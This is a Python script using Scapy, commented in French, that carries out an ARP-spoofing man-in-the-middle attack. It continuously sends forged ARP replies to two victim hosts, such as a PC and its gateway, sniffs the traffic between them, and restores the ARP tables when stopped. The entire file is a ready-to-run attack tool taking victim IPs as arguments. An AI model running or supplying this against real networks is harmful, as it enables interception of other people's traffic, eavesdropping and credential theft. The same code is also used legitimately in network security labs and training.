from scapy.all import *
import sys
import threading
import os
import signal

def arp_spoof(target_ip, spoof_ip, interface):
    """
    Envoie en boucle des paquets ARP falsifiés pour empoisonner les tables ARP.
    Args:
        target_ip (str): IP de la victime.
        spoof_ip (str): IP usurpée (passerelle ou autre victime).
        interface (str): Interface réseau à utiliser.
    """
    target_mac = getmacbyip(target_ip)
    if not target_mac:
        print(f"[!] Impossible de trouver l'adresse MAC pour {target_ip}")
        sys.exit(1)
    
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(f"[+] Envoi d'empoisonnement ARP : {target_ip} pense que {spoof_ip} a l'adresse MAC {packet.hwsrc}")

    while True:
        send(packet, verbose=0, iface=interface)
        time.sleep(2)  # Envoie en boucle toutes les 2 secondes

def restore_arp(target_ip, spoof_ip, interface):
    """
    Restaure les tables ARP des victimes à leur état original.
    Args:
        target_ip (str): IP de la victime.
        spoof_ip (str): IP usurpée.
        interface (str): Interface réseau à utiliser.
    """
    target_mac = getmacbyip(target_ip)
    spoof_mac = getmacbyip(spoof_ip)
    if not target_mac or not spoof_mac:
        print(f"[!] Impossible de restaurer ARP pour {target_ip} et {spoof_ip}")
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=5, verbose=0, iface=interface)
    print(f"[+] ARP restauré : {target_ip} -> {spoof_ip}")

def mitm(target_ip1, target_ip2, interface):
    """
    Lance l'attaque Man-in-the-Middle ARP.
    Args:
        target_ip1 (str): IP de la première victime (ex : PC1).
        target_ip2 (str): IP de la deuxième victime (ex : Passerelle).
        interface (str): Interface réseau à utiliser.
    """
    try:
        # Lancer deux threads pour les attaques ARP
        threading.Thread(target=arp_spoof, args=(target_ip1, target_ip2, interface), daemon=True).start()
        threading.Thread(target=arp_spoof, args=(target_ip2, target_ip1, interface), daemon=True).start()
        
        # Capturer les paquets pour prouver le MITM
        print("[+] Attaque MITM en cours... Capturer les paquets avec Wireshark ou tshark.")
        sniff(filter=f"host {target_ip1} or host {target_ip2}", iface=interface, prn=lambda x: x.summary())

    except KeyboardInterrupt:
        print("\n[!] Arrêt de l'attaque, restauration des tables ARP...")
        restore_arp(target_ip1, target_ip2, interface)
        restore_arp(target_ip2, target_ip1, interface)
        print("[+] ARP restauré. Fin de l'attaque.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python arp_mitm.py <IP_victime1> <IP_victime2> <interface>")
        sys.exit(1)

    victim1_ip = sys.argv[1]  # IP de la victime 1 (ex : PC1)
    victim2_ip = sys.argv[2]  # IP de la victime 2 (ex : Passerelle)
    iface = sys.argv[3]       # Interface réseau (ex : eth0)

    mitm(victim1_ip, victim2_ip, iface)

